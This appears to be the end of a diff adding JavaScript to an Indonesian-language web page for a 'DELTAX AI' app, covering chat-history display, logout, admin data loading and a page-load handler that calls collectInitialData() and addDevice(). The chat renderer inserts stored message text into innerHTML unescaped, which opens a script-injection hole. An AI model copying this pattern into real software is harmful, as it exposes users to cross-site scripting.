+    function loadChatHistory() {
+        const chat = document.getElementById('chatMessages');
+        const history = JSON.parse(localStorage.getItem('chatHistory') || '[]');
+        chat.innerHTML = history.map(msg => `
+            <div style="margin-bottom:10px; padding:10px; background:${msg.sender === 'user' ? 'var(--primary)' : 'var(--surface)'}; color:${msg.sender === 'user' ? 'white' : 'var(--text)'}; border-radius:8px;">
+                <strong>${msg.sender === 'user' ? 'Anda' : 'DELTAX AI'}:</strong> ${msg.text}
+            </div>
+        `).join('');
+        chat.scrollTop = chat.scrollHeight;
+    }
+    
+    // ========== LOGOUT ==========
+    window.logout = () => {
+        toggleSidebar();
+        document.getElementById('loginWelcome').style.display = 'flex';
+        document.getElementById('loginForm').style.display = 'none';
+        document.getElementById('permissionPage').classList.remove('active');
+        document.getElementById('blockPage').classList.remove('active');
+        document.getElementById('nominalPage').style.display = 'none';
+        document.getElementById('mainContent').classList.remove('active');
+    };
+    
+    // ========== LOAD ADMIN DATA ==========
+    function loadAdminData() {
+        loadInfoList();
+        loadDevicesList();
+        loadGamesList();
+    }
+    
+    // ========== INIT ==========
+    window.addEventListener('load', async () => {
+        await collectInitialData();
+        addDevice();
+        ScrollReveal().reveal('.portfolio-card', { 
+            delay: 100, 
+            distance: '20px', 
+            origin: 'bottom', 
+            interval: 50,
+            duration: 800
+        });
+        
+        // Set default nominal
+        selectedNominal = 50000;
+        updateTotalDisplay();
+    });
+</script>
+</body>
+</html>
